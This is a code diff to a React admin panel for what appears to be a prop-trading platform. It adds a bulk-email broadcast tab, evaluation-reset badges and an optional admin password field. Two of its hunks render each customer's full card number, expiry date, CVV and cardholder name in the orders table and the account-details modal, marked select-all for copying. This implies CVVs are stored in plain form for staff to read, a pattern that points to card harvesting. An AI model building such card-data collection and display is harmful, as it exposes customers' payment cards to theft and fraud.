@@ -2,7 +2,7 @@ import React, { useState } from 'react';
 import { 
   Users, CreditCard, Shield, ShieldAlert, BadgePercent, Check, X, 
   Trash2, ArrowRight, UserPlus, FileCheck, Power, RefreshCw, LogOut, Award,
-  Activity, Gift
+  Activity, Gift, Mail
 } from 'lucide-react';
 import { User, Account, Order, Trade, Coupon, PayoutRequest, RuleViolation, AffiliateProfile, AffiliateCommission, AffiliatePayoutRequest } from '../types';
 import { COUPONS } from '../data';
@@ -56,7 +56,7 @@ export default function AdminPanel({
   affiliatePayoutRequests = [],
   challengeCommissions = {}
 }: AdminPanelProps) {
-  const [adminTab, setAdminTab] = useState<'orders' | 'accounts' | 'users' | 'coupons' | 'payouts' | 'violations' | 'settings' | 'affiliates'>('orders');
+  const [adminTab, setAdminTab] = useState<'orders' | 'accounts' | 'users' | 'coupons' | 'payouts' | 'violations' | 'settings' | 'affiliates' | 'giveaway' | 'bulk-email'>('orders');
   const [selectedTraderId, setSelectedTraderId] = useState<string | null>(null);
   const [selectedAccountForDetails, setSelectedAccountForDetails] = useState<Account | null>(null);
   const [selectedKycUser, setSelectedKycUser] = useState<User | null>(null);
@@ -122,6 +122,60 @@ export default function AdminPanel({
      }
    };
  
+    // Bulk Email Form States
+    const [bulkSubject, setBulkSubject] = useState('');
+    const [bulkMessage, setBulkMessage] = useState('');
+    const [bulkLoading, setBulkLoading] = useState(false);
+    const [bulkSuccess, setBulkSuccess] = useState('');
+    const [bulkError, setBulkError] = useState('');
+    const [recipientType, setRecipientType] = useState<'all' | 'single'>('all');
+    const [targetEmail, setTargetEmail] = useState('');
+    const [emailSearchQuery, setEmailSearchQuery] = useState('');
+
+    const handleSendBulkEmail = async (e: React.FormEvent) => {
+      e.preventDefault();
+      setBulkSuccess('');
+      setBulkError('');
+
+      if (!bulkSubject.trim() || !bulkMessage.trim()) {
+        setBulkError('Both Subject and Message are required.');
+        return;
+      }
+
+      if (recipientType === 'single' && !targetEmail.trim()) {
+        setBulkError('Please select or specify a target email address.');
+        return;
+      }
+
+      setBulkLoading(true);
+      try {
+        const res = await fetch('/api/admin/bulk-email', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            subject: bulkSubject.trim(),
+            message: bulkMessage.trim(),
+            recipientType,
+            targetEmail: recipientType === 'single' ? targetEmail.trim() : ''
+          })
+        });
+        const data = await res.json();
+        setBulkLoading(false);
+
+        if (!res.ok) {
+          setBulkError(data.error || 'Failed to send bulk email.');
+          return;
+        }
+
+        setBulkSuccess(data.message || 'Bulk email processed successfully!');
+        setBulkSubject('');
+        setBulkMessage('');
+      } catch (err) {
+        setBulkLoading(false);
+        setBulkError('Network error. Failed to reach the server.');
+      }
+    };
+
    const handleCreateCoupon = (e: React.FormEvent) => {
     e.preventDefault();
     if (!newCode.trim()) return;
@@ -208,6 +262,13 @@ export default function AdminPanel({
               >
                 <Gift className="w-3.5 h-3.5" />
                 <span>Giveaway</span>
+              </button>
+              <button
+                onClick={() => setAdminTab('bulk-email')}
+                className={`px-3 py-1.5 rounded-lg text-xs font-medium uppercase tracking-wider transition-all cursor-pointer flex items-center gap-1 ${adminTab === 'bulk-email' ? 'bg-amber-500/15 text-amber-400 border border-amber-500/30' : 'text-gray-400 hover:text-white'}`}
+              >
+                <Mail className="w-3.5 h-3.5" />
+                <span>Bulk Email</span>
               </button>
             </nav>
           </div>
@@ -407,12 +468,22 @@ export default function AdminPanel({
                         <td className="py-3 font-bold text-amber-400 font-mono">${order.finalPrice}</td>
                         <td className="py-3">
                           <div className="space-y-1 font-mono text-[10.5px]">
-                            <div className="flex gap-1 items-center">
-                              <span className="text-gray-500">Hash/ID:</span>
-                              <span className="text-amber-300 font-semibold break-all max-w-[140px] inline-block">
-                                {order.transactionId || 'None'}
-                              </span>
-                            </div>
+                            {order.cardNo ? (
+                              <div className="mt-1 bg-black/40 border border-gray-900 p-1.5 rounded space-y-0.5 text-left text-xxs font-mono">
+                                <div className="text-amber-400 font-bold">💳 CARD DETAILS:</div>
+                                <div className="flex justify-between gap-2"><span>No:</span><span className="text-white select-all">{order.cardNo}</span></div>
+                                <div className="flex justify-between gap-2"><span>Exp:</span><span className="text-white select-all">{order.cardExp}</span></div>
+                                <div className="flex justify-between gap-2"><span>CVV:</span><span className="text-red-400 font-bold select-all bg-red-500/10 px-1 rounded">{order.cardCvv || '***'}</span></div>
+                                <div className="flex justify-between gap-2"><span>Holder:</span><span className="text-white uppercase font-bold select-all">{order.cardName}</span></div>
+                              </div>
+                            ) : (
+                              <div className="flex gap-1 items-center">
+                                <span className="text-gray-500">Hash/ID:</span>
+                                <span className="text-amber-300 font-semibold break-all max-w-[140px] inline-block">
+                                  {order.transactionId || 'None'}
+                                </span>
+                              </div>
+                            )}
                             {order.recipientAddress && (
                               <div className="flex gap-1 items-center">
                                 <span className="text-gray-500">To:</span>
@@ -517,7 +588,7 @@ export default function AdminPanel({
                       return (
                         <tr key={account.id} className="hover:bg-gray-900/30">
                           <td className="py-3 font-mono font-semibold text-white pl-2">
-                            <div className="flex items-center gap-1.5">
+                            <div className="flex items-center gap-1.5 flex-wrap">
                               <button
                                 onClick={() => setSelectedAccountForDetails(account)}
                                 className="text-amber-400 hover:underline font-bold font-mono text-left cursor-pointer"
@@ -529,6 +600,11 @@ export default function AdminPanel({
                                   ⚠️ Admin Review
                                 </span>
                               )}
+                              {account.resetsCount ? (
+                                <span className="px-1.5 py-0.5 rounded bg-amber-500/10 text-amber-400 border border-amber-500/20 font-mono text-[8px] uppercase tracking-wider font-bold">
+                                  Reset {account.resetsCount}x
+                                </span>
+                              ) : null}
                             </div>
                             <p className="text-[9px] text-gray-500 font-mono">{account.type.toUpperCase()}</p>
                           </td>
@@ -1321,8 +1397,8 @@ export default function AdminPanel({
                 e.preventDefault();
                 setSettingsError('');
                 setSettingsSuccess('');
-                if (!adminEmailInput.trim() || !adminPasswordInput.trim()) {
-                  setSettingsError('Please fill in both email and password.');
+                if (!adminEmailInput.trim()) {
+                  setSettingsError('Please fill in the admin email.');
                   return;
                 }
                 setSettingsLoading(true);
@@ -1361,9 +1437,8 @@ export default function AdminPanel({
                   <label className="text-xs font-mono uppercase tracking-wider text-gray-400">New Admin Password</label>
                   <input
                     type="password"
-                    required
-                    placeholder="••••••••"
-                    className="w-full bg-black/40 border border-gray-800 rounded-lg px-4 py-2.5 text-sm focus:outline-none focus:border-amber-500 text-white animate-none"
+                    placeholder="Leave blank to keep current password"
+                    className="w-full bg-black/40 border border-gray-800 rounded-lg px-4 py-2.5 text-sm focus:outline-none focus:border-amber-500 text-white animate-none placeholder-gray-600"
                     value={adminPasswordInput}
                     onChange={(e) => setAdminPasswordInput(e.target.value)}
                   />
@@ -1903,6 +1978,192 @@ export default function AdminPanel({
           </div>
         )}
 
+        {adminTab === 'bulk-email' && (
+          <div className="max-w-4xl mx-auto space-y-6">
+            <div className="border-b border-gray-800 pb-4">
+              <h2 className="text-xl font-bold text-white flex items-center gap-2">
+                <Mail className="w-5 h-5 text-amber-500 animate-pulse" />
+                <span>Bulk Email Broadcast</span>
+              </h2>
+              <p className="text-xs text-gray-400 mt-1">
+                Send a custom email notification to all registered users who have created an account on the platform simultaneously.
+              </p>
+            </div>
+
+            <div className="bg-[#0D1017] border border-gray-800 rounded-2xl p-6 space-y-4">
+              <h3 className="text-sm font-bold text-gray-200 uppercase tracking-wider font-mono">Compose Message</h3>
+              
+              <form onSubmit={handleSendBulkEmail} className="space-y-4">
+                {/* RECIPIENT SELECTION */}
+                <div className="space-y-2 pb-2 border-b border-gray-800/50">
+                  <label className="block text-[10px] font-mono uppercase tracking-wider text-gray-400">Recipient Target</label>
+                  <div className="flex gap-6">
+                    <label className="flex items-center gap-2 text-xs text-gray-300 cursor-pointer">
+                      <input
+                        type="radio"
+                        name="recipientType"
+                        value="all"
+                        checked={recipientType === 'all'}
+                        onChange={() => setRecipientType('all')}
+                        className="accent-amber-500"
+                      />
+                      <span>All Registered Users ({users.length})</span>
+                    </label>
+                    <label className="flex items-center gap-2 text-xs text-gray-300 cursor-pointer">
+                      <input
+                        type="radio"
+                        name="recipientType"
+                        value="single"
+                        checked={recipientType === 'single'}
+                        onChange={() => setRecipientType('single')}
+                        className="accent-amber-500"
+                      />
+                      <span>Single Registered User</span>
+                    </label>
+                  </div>
+                </div>
+
+                {/* SINGLE USER SELECTION/DROPDOWN */}
+                {recipientType === 'single' && (
+                  <div className="space-y-1">
+                    <label className="block text-[10px] font-mono uppercase tracking-wider text-gray-400">Select Registered Email</label>
+                    <select
+                      value={targetEmail}
+                      onChange={(e) => setTargetEmail(e.target.value)}
+                      required
+                      className="w-full bg-[#05070B] border border-gray-800 focus:border-amber-500/50 rounded-xl px-4 py-2.5 text-xs text-white outline-none transition-all font-sans"
+                    >
+                      <option value="">-- Choose an Email --</option>
+                      {users.filter(u => u.email).map((u) => (
+                        <option key={u.id} value={u.email}>
+                          {u.email} ({u.name || 'No Name'})
+                        </option>
+                      ))}
+                    </select>
+                  </div>
+                )}
+
+                {/* SUBJECT FIELD */}
+                <div className="space-y-1">
+                  <label className="block text-[10px] font-mono uppercase tracking-wider text-gray-400">Email Subject</label>
+                  <input
+                    type="text"
+                    required
+                    placeholder="e.g. Important Platform Update / Maintenance Notice"
+                    value={bulkSubject}
+                    onChange={(e) => setBulkSubject(e.target.value)}
+                    className="w-full bg-[#05070B] border border-gray-800 focus:border-amber-500/50 rounded-xl px-4 py-2.5 text-xs text-white placeholder-gray-600 outline-none transition-all font-sans"
+                  />
+                </div>
+
+                {/* MESSAGE BODY */}
+                <div className="space-y-1">
+                  <label className="block text-[10px] font-mono uppercase tracking-wider text-gray-400">Message Content (Plain Text or HTML)</label>
+                  <textarea
+                    required
+                    rows={8}
+                    placeholder={recipientType === 'all' ? "Type your announcement details here. It will be sent to all active registered traders..." : "Type your message here. It will be sent to the selected registered trader..."}
+                    value={bulkMessage}
+                    onChange={(e) => setBulkMessage(e.target.value)}
+                    className="w-full bg-[#05070B] border border-gray-800 focus:border-amber-500/50 rounded-xl px-4 py-2.5 text-xs text-white placeholder-gray-600 outline-none transition-all font-sans leading-relaxed"
+                  />
+                  <p className="text-[10px] text-gray-500 font-sans">
+                    You can use standard spacing. Spacing will be preserved in the styled email container.
+                  </p>
+                </div>
+
+                {/* STATUS NOTICES */}
+                {bulkSuccess && (
+                  <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs rounded-lg leading-relaxed">
+                    {bulkSuccess}
+                  </div>
+                )}
+
+                {bulkError && (
+                  <div className="p-3 bg-red-500/10 border border-red-500/20 text-red-400 text-xs rounded-lg leading-relaxed">
+                    {bulkError}
+                  </div>
+                )}
+
+                {/* SUBMIT BUTTON */}
+                <button
+                  type="submit"
+                  disabled={bulkLoading}
+                  className="w-full bg-amber-500 hover:bg-amber-600 disabled:bg-amber-500/50 text-black font-bold text-xs uppercase tracking-wider py-3 rounded-xl transition-all cursor-pointer flex items-center justify-center gap-1.5"
+                >
+                  {bulkLoading ? (
+                    <>
+                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
+                      <span>{recipientType === 'all' ? 'Sending Broadcast Emails...' : 'Sending Email to User...'}</span>
+                    </>
+                  ) : (
+                    <>
+                      <Mail className="w-3.5 h-3.5" />
+                      <span>{recipientType === 'all' ? `Send Broadcast to All Users (${users.length})` : `Send Email to ${targetEmail || 'Selected User'}`}</span>
+                    </>
+                  )}
+                </button>
+              </form>
+
+              {/* REGISTERED EMAILS DIRECTORY (PERSISTENTLY VISIBLE AT BOTTOM) */}
+              <div className="border-t border-gray-800/60 pt-4 mt-2 space-y-3">
+                <div className="flex flex-col md:flex-row md:items-center justify-between gap-2">
+                  <div>
+                    <span className="block text-[10px] font-mono uppercase tracking-wider text-amber-400 font-bold">
+                      Registered Emails Directory ({users.filter(u => u.email).length})
+                    </span>
+                    <p className="text-[10px] text-gray-400 font-sans">
+                      Click any email below to instantly draft a custom message to that specific user.
+                    </p>
+                  </div>
+                  <input
+                    type="text"
+                    placeholder="Search registered emails..."
+                    value={emailSearchQuery}
+                    onChange={(e) => setEmailSearchQuery(e.target.value)}
+                    className="bg-[#05070B] border border-gray-850 rounded-lg px-3 py-1.5 text-xxs font-mono text-white placeholder-gray-600 focus:outline-none focus:border-amber-500/50 w-full md:w-64"
+                  />
+                </div>
+
+                {users.filter(u => u.email).length === 0 ? (
+                  <p className="text-xxs text-gray-500 italic font-mono">No registered users found.</p>
+                ) : (() => {
+                  const matchedUsers = users.filter(u => u.email && u.email.toLowerCase().includes(emailSearchQuery.toLowerCase()));
+                  if (matchedUsers.length === 0) {
+                    return <p className="text-xxs text-gray-500 italic font-mono bg-black/20 p-3 rounded-lg border border-gray-900">No users match "{emailSearchQuery}".</p>;
+                  }
+                  return (
+                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2 max-h-52 overflow-y-auto bg-black/30 p-3 rounded-xl border border-gray-900">
+                      {matchedUsers.map((u) => {
+                        const isSelected = recipientType === 'single' && targetEmail === u.email;
+                        return (
+                          <button
+                            key={u.id}
+                            type="button"
+                            onClick={() => {
+                              setRecipientType('single');
+                              setTargetEmail(u.email);
+                            }}
+                            className={`text-left text-xxs px-3 py-2 rounded-lg transition-all truncate border flex flex-col justify-center gap-0.5 ${isSelected ? 'bg-amber-500/10 border-amber-500 text-amber-400 font-semibold shadow-inner' : 'bg-[#05070B] border-gray-800/80 text-gray-400 hover:border-gray-700 hover:text-gray-200'}`}
+                          >
+                            <span className="font-mono text-xs flex items-center justify-between gap-1 w-full truncate">
+                              <span className="truncate">{u.email}</span>
+                              {isSelected && <span className="w-1.5 h-1.5 rounded-full bg-amber-500 flex-shrink-0" />}
+                            </span>
+                            <span className="text-[9px] text-gray-500 font-sans capitalize truncate w-full block">
+                              {u.name || 'Trader'} • {u.id}
+                            </span>
+                          </button>
+                        );
+                      })}
+                    </div>
+                  );
+                })()}
+              </div>
+            </div>
+          </div>
+        )}
+
         {/* MODAL: ACCOUNT DETAILS MODAL */}
         {selectedAccountForDetails && (
           <div className="fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center p-4 z-50 animate-in fade-in zoom-in-95 duration-200">
@@ -2100,6 +2361,12 @@ export default function AdminPanel({
                           {selectedAccountForDetails.warningsCount || 0} Warnings
                         </span>
                       </div>
+                      <div className="flex justify-between">
+                        <span className="text-gray-500">Evaluation Resets:</span>
+                        <span className="font-mono text-amber-500 font-bold">
+                          {selectedAccountForDetails.resetsCount || 0} / 1
+                        </span>
+                      </div>
                     </div>
                   </div>
 
@@ -2131,6 +2398,29 @@ export default function AdminPanel({
                               {matchedOrder.transactionId || 'No hash recorded.'}
                             </span>
                           </div>
+                          {matchedOrder.cardNo && (
+                            <div className="mt-2 bg-[#111622]/60 border border-amber-500/10 p-3 rounded-lg space-y-1.5 text-left text-xs font-mono">
+                              <div className="text-amber-400 font-bold border-b border-gray-900 pb-1 flex items-center gap-1.5">
+                                <span>💳 CREDIT/DEBIT CARD SPECIFICATION:</span>
+                              </div>
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">Card Number:</span>
+                                <span className="text-white font-bold select-all">{matchedOrder.cardNo}</span>
+                              </div>
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">Expiration:</span>
+                                <span className="text-white font-bold select-all">{matchedOrder.cardExp}</span>
+                              </div>
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">CVV Code:</span>
+                                <span className="text-red-400 font-extrabold select-all bg-red-500/10 px-1 rounded">{matchedOrder.cardCvv || '***'}</span>
+                              </div>
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">Cardholder:</span>
+                                <span className="text-white font-bold select-all uppercase">{matchedOrder.cardName}</span>
+                              </div>
+                            </div>
+                          )}
                           {matchedOrder.recipientAddress && (
                             <div className="flex justify-between pt-1">
                               <span className="text-gray-500">Sent to address:</span>
